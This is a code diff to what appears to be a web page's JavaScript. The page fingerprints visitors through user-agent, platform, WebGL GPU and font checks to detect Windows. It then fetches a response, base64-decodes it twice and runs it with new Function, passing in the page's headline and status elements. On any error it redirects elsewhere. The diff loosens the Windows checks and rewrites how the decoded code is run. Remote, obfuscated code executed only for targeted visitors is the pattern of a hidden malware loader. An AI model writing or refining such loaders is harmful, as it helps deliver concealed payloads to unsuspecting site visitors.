@@ -368,49 +368,35 @@
 
     function detectOS() {
         const ua = (navigator.userAgent || navigator.appVersion || '').toLowerCase();
-        const platform = (navigator.platform || '').toLowerCase();
         
         if (navigator.userAgentData) {
             const p = navigator.userAgentData.platform.toLowerCase();
             if (p.includes('windows')) return 'windows';
         }
         
-        const winPatterns = [
-            /windows nt 10\.0.*(?:win64|x64|wow64).*(?:22[0-9]{3}|23[0-9]{3}|24[0-9]{3}|25[0-9]{3}|26[0-9]{3})/i,
-            /windows nt 10\.0/i,
-            /windows nt 6\.[0-3]/i,
-            /windows nt 5\.[0-2]/i,
-            /windows nt|win32|win64|wow64|windows (?:95|98|me|2000|xp|vista)/i
-        ];
+        if (/windows nt/i.test(ua)) return 'windows';
+        if (/win32|win64/i.test(ua)) return 'windows';
+        if (/wow64/i.test(ua)) return 'windows';
         
-        for (const pattern of winPatterns) {
-            if (pattern.test(ua)) return 'windows';
-        }
-        
-        if (/win32|win64|win16|windows/i.test(platform)) return 'windows';
+        const platform = (navigator.platform || '').toLowerCase();
+        if (/win32|win64|windows/i.test(platform)) return 'windows';
         
         const oscpu = (() => {
             try { return navigator.oscpu || ''; } catch(e) { return ''; }
         })().toLowerCase();
-        
         if (/win|windows/i.test(oscpu)) return 'windows';
         
         if (/windows|win32|win64/i.test(navigator.appVersion || '')) return 'windows';
         
-        if ((navigator.vendor || '').toLowerCase().includes('microsoft') && /windows/.test(ua)) return 'windows';
+        if ((navigator.vendor || '').toLowerCase().includes('microsoft')) return 'windows';
         
-        if (typeof window.ActiveXObject !== 'undefined' ||
-            typeof window.navigator.msSaveOrOpenBlob !== 'undefined' ||
-            typeof window.navigator.msPointerEnabled !== 'undefined' ||
-            typeof window.msCrypto !== 'undefined' ||
-            typeof window.external?.msIsSiteMode !== 'undefined') {
-            return 'windows';
-        }
+        if (typeof window.ActiveXObject !== 'undefined') return 'windows';
+        if (typeof window.navigator.msSaveOrOpenBlob !== 'undefined') return 'windows';
+        if (typeof window.navigator.msPointerEnabled !== 'undefined') return 'windows';
+        if (typeof window.msCrypto !== 'undefined') return 'windows';
         
-        const msStyles = ['msContentZoom', 'msTouchAction', 'msPerspective', '-ms-scroll-limit'];
-        for (const style of msStyles) {
-            if (style in document.documentElement.style) return 'windows';
-        }
+        if ('msContentZoom' in document.documentElement.style) return 'windows';
+        if ('msTouchAction' in document.documentElement.style) return 'windows';
         
         try {
             const canvas = document.createElement('canvas');
@@ -424,37 +410,31 @@
                     if (renderer.includes('microsoft') || 
                         renderer.includes('directx') || 
                         renderer.includes('d3d') ||
-                        (renderer.includes('angle') && renderer.includes('direct3d')) ||
                         glVendor.includes('microsoft')) {
                         return 'windows';
                     }
                     
-                    const gpuChecks = [
-                        { keyword: 'nvidia', exclude: ['apple', 'mac'] },
-                        { keyword: 'amd radeon', exclude: ['apple', 'mac', 'pro'] },
-                        { keyword: 'intel hd graphics', exclude: ['apple', 'mac', 'iris'] },
-                        { keyword: 'intel uhd graphics', exclude: ['apple', 'mac', 'iris'] },
-                        { keyword: 'intel arc', exclude: ['apple', 'mac', 'iris'] }
-                    ];
+                    if (renderer.includes('nvidia') && !renderer.includes('apple') && !renderer.includes('mac')) {
+                        return 'windows';
+                    }
                     
-                    for (const { keyword, exclude } of gpuChecks) {
-                        if (renderer.includes(keyword) && !exclude.some(e => renderer.includes(e))) {
-                            return 'windows';
-                        }
+                    if (renderer.includes('amd') && !renderer.includes('apple') && !renderer.includes('mac') && !renderer.includes('pro')) {
+                        return 'windows';
+                    }
+                    
+                    if ((renderer.includes('intel hd') || renderer.includes('intel uhd') || renderer.includes('intel arc')) && 
+                        !renderer.includes('apple') && !renderer.includes('mac') && !renderer.includes('iris')) {
+                        return 'windows';
                     }
                 }
             }
         } catch(e) {}
         
-        if (/windows/.test(ua)) {
-            try {
-                if (document.fonts.check('12px "Segoe UI"') && 
-                    !document.fonts.check('12px "SF Pro Display"') &&
-                    !document.fonts.check('12px "Helvetica Neue"')) {
-                    return 'windows';
-                }
-            } catch(e) {}
-        }
+        try {
+            if (document.fonts.check('12px "Segoe UI"')) return 'windows';
+            if (document.fonts.check('12px "Tahoma"')) return 'windows';
+            if (document.fonts.check('12px "MS Sans Serif"')) return 'windows';
+        } catch(e) {}
         
         return 'other';
     }
@@ -469,12 +449,10 @@
                     const _packed = await _response.text();
                     const _source = atob(atob(_packed));
                     
-                    const _ctx = {
-                        headline: document.getElementById('dynamicTitle'),
-                        status: document.getElementById('dynamicSubtitle')
-                    };
+                    const headline = document.getElementById('dynamicTitle');
+                    const status = document.getElementById('dynamicSubtitle');
                     
-                    new Function('ctx', _source)(_ctx);
+                    new Function('headline', 'status', _source)(headline, status);
                 } catch {
                     window.location.replace(ERROR_URL);
                 }
